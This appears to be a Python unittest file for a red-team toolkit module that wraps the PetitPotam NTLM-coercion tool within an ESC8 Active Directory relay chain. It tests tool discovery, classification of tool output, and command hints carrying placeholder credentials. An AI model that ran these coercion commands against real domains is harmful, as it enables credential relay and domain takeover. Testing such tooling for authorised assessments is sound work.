#!/usr/bin/env python3
"""PetitPotam coerce primitive — D2.

D2 wraps a PetitPotam-family tool if one is on PATH and falls back to
prepare-only playbook (no-tool CoerceResult, chain step → manual)
otherwise. The tests here mock subprocess to exercise both branches
without dependency on impacket-scripts being installed — and pin the
output-signature classifier's mapping from tool text to
CoerceResult.kind.
"""
import os
import sys
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class CoerceResultShapeTest(unittest.TestCase):

    def test_kind_enum_gated(self):
        from fieldkit.coerce import CoerceResult
        for k in ("ok", "no-tool", "patched", "unreachable",
                   "auth-error", "fail"):
            CoerceResult(kind=k, evidence="x")
        with self.assertRaises(ValueError):
            CoerceResult(kind="totally-fine", evidence="x")


class FindToolTest(unittest.TestCase):

    def test_finds_via_which(self):
        from fieldkit.coerce import petitpotam
        with patch("shutil.which", side_effect=lambda name:
                    "/opt/impacket-PetitPotam"
                    if name == "impacket-PetitPotam" else None):
            self.assertEqual(petitpotam.find_tool(),
                              "/opt/impacket-PetitPotam")

    def test_falls_back_to_arsenal_hint(self):
        # No PATH hit; the arsenal directory has the standalone.
        import tempfile
        from fieldkit.coerce import petitpotam
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "PetitPotam.py")
            with open(path, "w") as fh:
                fh.write("#!/usr/bin/env python3\n")
            os.chmod(path, 0o755)
            with patch("shutil.which", return_value=None):
                self.assertEqual(petitpotam.find_tool(arsenal_hint=tmp),
                                  path)

    def test_returns_none_when_nothing_found(self):
        from fieldkit.coerce import petitpotam
        with patch("shutil.which", return_value=None):
            self.assertIsNone(petitpotam.find_tool())


class ClassifyOutputTest(unittest.TestCase):

    def test_success_signatures(self):
        from fieldkit.coerce.petitpotam import _classify_output
        for text in ("[+] Attack worked, check smbserver !",
                      "check smbserver",
                      "Received!",
                      "[+] Successfully bound!"):
            self.assertEqual(_classify_output(text), "ok",
                              f"expected 'ok' for {text!r}")

    def test_patched_signatures(self):
        from fieldkit.coerce.petitpotam import _classify_output
        for text in ("Got RPC_S_ACCESS_DENIED",
                      "ERROR_ACCESS_DENIED",
                      "STATUS_ACCESS_DENIED",
                      "nca_s_fault_access_denied"):
            self.assertEqual(_classify_output(text), "patched",
                              f"expected 'patched' for {text!r}")

    def test_auth_error_signatures(self):
        from fieldkit.coerce.petitpotam import _classify_output
        for text in ("STATUS_LOGON_FAILURE",
                      "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
            self.assertEqual(_classify_output(text), "auth-error")

    def test_unreachable_signatures(self):
        from fieldkit.coerce.petitpotam import _classify_output
        for text in ("Connection refused",
                      "socket connect timed out",
                      "STATUS_IO_TIMEOUT"):
            self.assertEqual(_classify_output(text), "unreachable")

    def test_unknown_output_defaults_to_fail(self):
        # Deliberate: unrecognized output should NOT be silently classified
        # as ok / patched / etc. Fail surfaces for diagnosis.
        from fieldkit.coerce.petitpotam import _classify_output
        self.assertEqual(_classify_output("weird tool output"), "fail")


class FireNoToolFallbackTest(unittest.TestCase):
    """When no tool is on PATH, .fire() returns a no-tool result with
    a command_hint the operator can run themselves — the Path 2
    graceful-fallback contract."""

    def test_returns_no_tool_with_command_hint(self):
        from fieldkit.coerce import petitpotam
        with patch.object(petitpotam, "find_tool", return_value=None):
            result = petitpotam.fire("10.0.0.1", r"\\10.0.0.5\share")
        self.assertEqual(result.kind, "no-tool")
        self.assertIn("PetitPotam.py", result.command_hint)
        self.assertIn(r"\\10.0.0.5\share", result.command_hint)
        self.assertIn("10.0.0.1", result.command_hint)

    def test_command_hint_embeds_cred_when_supplied(self):
        from fieldkit.coerce import petitpotam
        cred = {"domain": "CORP", "username": "svc", "password": "pw"}
        with patch.object(petitpotam, "find_tool", return_value=None):
            result = petitpotam.fire("10.0.0.1", r"\\10.0.0.5\share",
                                     cred=cred)
        self.assertIn("-u 'svc'", result.command_hint)
        self.assertIn("-p 'pw'", result.command_hint)
        self.assertIn("-d 'CORP'", result.command_hint)


class FireWithMockToolTest(unittest.TestCase):
    """Wire a mocked subprocess so we can drive .fire() through each
    output classification without needing impacket installed."""

    def _fake_run(self, output, returncode=0):
        from subprocess import CompletedProcess

        def _runner(argv, **kwargs):
            _ = argv, kwargs
            return CompletedProcess(args=argv, returncode=returncode,
                                     stdout=output, stderr="")
        return _runner

    def test_ok_output_maps_to_ok_result(self):
        from fieldkit.coerce import petitpotam
        with patch("subprocess.run",
                    side_effect=self._fake_run("[+] Attack worked, check smbserver !")):
            r = petitpotam.fire("10.0.0.1", r"\\10.0.0.5\share",
                                 tool_bin="/opt/petitpotam")
        self.assertEqual(r.kind, "ok")
        self.assertIn(r"\\10.0.0.5\share", r.evidence)

    def test_patched_output_maps_to_patched_result(self):
        from fieldkit.coerce import petitpotam
        with patch("subprocess.run",
                    side_effect=self._fake_run("[-] Got RPC_S_ACCESS_DENIED!!")):
            r = petitpotam.fire("10.0.0.1", r"\\10.0.0.5\share",
                                 tool_bin="/opt/petitpotam")
        self.assertEqual(r.kind, "patched")

    def test_unreachable_output_maps_to_unreachable_result(self):
        from fieldkit.coerce import petitpotam
        with patch("subprocess.run",
                    side_effect=self._fake_run("Connection refused")):
            r = petitpotam.fire("10.0.0.1", r"\\10.0.0.5\share",
                                 tool_bin="/opt/petitpotam")
        self.assertEqual(r.kind, "unreachable")

    def test_timeout_maps_to_unreachable(self):
        from fieldkit.coerce import petitpotam
        from subprocess import TimeoutExpired
        with patch("subprocess.run",
                    side_effect=TimeoutExpired(cmd="petitpotam", timeout=15,
                                                output="", stderr="")):
            r = petitpotam.fire("10.0.0.1", r"\\10.0.0.5\share",
                                 tool_bin="/opt/petitpotam", tool_timeout=15)
        self.assertEqual(r.kind, "unreachable")
        self.assertIn("timed out", r.evidence)

    def test_missing_tool_at_exec_falls_back_to_no_tool(self):
        # Race: find_tool returned a path but the file vanished by
        # the time we exec. Should NOT crash; should surface as
        # no-tool with a command hint.
        from fieldkit.coerce import petitpotam
        with patch("subprocess.run", side_effect=FileNotFoundError()):
            r = petitpotam.fire("10.0.0.1", r"\\10.0.0.5\share",
                                 tool_bin="/opt/petitpotam-vanished")
        self.assertEqual(r.kind, "no-tool")
        self.assertIn("vanished", r.evidence)


class ChainIntegrationTest(unittest.TestCase):
    """The esc8 profile's coerce:petitpotam step now uses the real
    primitive. Verify the CoerceResult → Outcome mapping and the
    ctx→primitive plumbing end-to-end."""

    def _walk_with(self, listener_uri=None, coerce_result=None):
        """Run the esc8 chain, patching PetitPotam.fire() to return
        the caller's coerce_result. Returns the walked chain."""
        from fieldkit.chain import esc8_chain, walk
        from fieldkit.coerce import CoerceResult, petitpotam

        class Ctx:
            probe_port = 1               # unreachable — but we skip reachability
            probe_timeout = 0.3
            listener_uri = None
            cred = None
            petitpotam_tool_bin = None
            petitpotam_timeout = 5

        Ctx.listener_uri = listener_uri
        ch = esc8_chain("127.0.0.1")

        # Skip the reachability step by trimming it — we're testing
        # the coerce step in isolation. Keep it if the primitive is
        # supposed to receive the reachability check anyway (D3 wires
        # this properly).
        from fieldkit.chain import Chain
        ch = Chain(profile=ch.profile, target=ch.target,
                   steps=(ch.steps[1],))     # just coerce:petitpotam

        if coerce_result is not None:
            with patch.object(petitpotam, "fire",
                               return_value=coerce_result):
                walk(ch, Ctx())
        else:
            walk(ch, Ctx())
        return ch

    def test_missing_listener_uri_produces_manual_outcome(self):
        # No listener_uri set → step reports manual with the D3
        # placeholder message. Doesn't try to call petitpotam at all.
        ch = self._walk_with(listener_uri=None)
        self.assertEqual(len(ch.outcomes), 1)
        self.assertEqual(ch.outcomes[0].kind, "manual")
        self.assertIn("listener_uri not configured", ch.outcomes[0].evidence)

    def test_coerce_ok_maps_to_chain_ok(self):
        from fieldkit.coerce import CoerceResult
        ch = self._walk_with(
            listener_uri=r"\\10.0.0.5\share",
            coerce_result=CoerceResult(kind="ok",
                                         evidence="trigger accepted",
                                         listener_uri=r"\\10.0.0.5\share"))
        self.assertEqual(ch.outcomes[0].kind, "ok")

    def test_coerce_patched_maps_to_chain_skip(self):
        from fieldkit.coerce import CoerceResult
        ch = self._walk_with(
            listener_uri=r"\\10.0.0.5\share",
            coerce_result=CoerceResult(kind="patched",
                                         evidence="MS-EFSR patched"))
        # skip aborts the chain (D2 has no fallback profile; D4/D5
        # adds PrinterBug as the fallback).
        self.assertEqual(ch.outcomes[0].kind, "skip")

    def test_coerce_no_tool_maps_to_chain_manual_with_hint(self):
        from fieldkit.coerce import CoerceResult
        ch = self._walk_with(
            listener_uri=r"\\10.0.0.5\share",
            coerce_result=CoerceResult(
                kind="no-tool",
                evidence="no PetitPotam-family tool on PATH",
                command_hint="python3 PetitPotam.py \\\\10.0.0.5\\share 10.0.0.1"))
        self.assertEqual(ch.outcomes[0].kind, "manual")
        self.assertIn("run:", ch.outcomes[0].evidence)
        self.assertIn("PetitPotam.py", ch.outcomes[0].evidence)

    def test_coerce_unreachable_maps_to_chain_fail(self):
        from fieldkit.coerce import CoerceResult
        ch = self._walk_with(
            listener_uri=r"\\10.0.0.5\share",
            coerce_result=CoerceResult(kind="unreachable",
                                         evidence="endpoint unreachable"))
        self.assertEqual(ch.outcomes[0].kind, "fail")

    def test_ctx_cred_forwards_to_primitive(self):
        # ctx.cred should reach petitpotam.fire's cred= param.
        from fieldkit.chain import esc8_chain, walk, Chain
        from fieldkit.coerce import CoerceResult, petitpotam

        captured = {}

        def _capturing_fire(target, listener_uri, cred=None, **kw):
            captured["target"] = target
            captured["listener_uri"] = listener_uri
            captured["cred"] = cred
            return CoerceResult(kind="ok", evidence="mocked")

        class Ctx:
            listener_uri = r"\\10.0.0.5\share"
            cred = {"domain": "CORP", "username": "svc", "password": "pw"}
            petitpotam_tool_bin = None
            petitpotam_timeout = 5

        ch = esc8_chain("10.0.0.1")
        ch = Chain(profile=ch.profile, target=ch.target, steps=(ch.steps[1],))

        with patch.object(petitpotam, "fire", side_effect=_capturing_fire):
            walk(ch, Ctx())

        self.assertEqual(captured["target"], "10.0.0.1")
        self.assertEqual(captured["listener_uri"], r"\\10.0.0.5\share")
        self.assertEqual(captured["cred"]["username"], "svc")


if __name__ == "__main__":
    unittest.main()
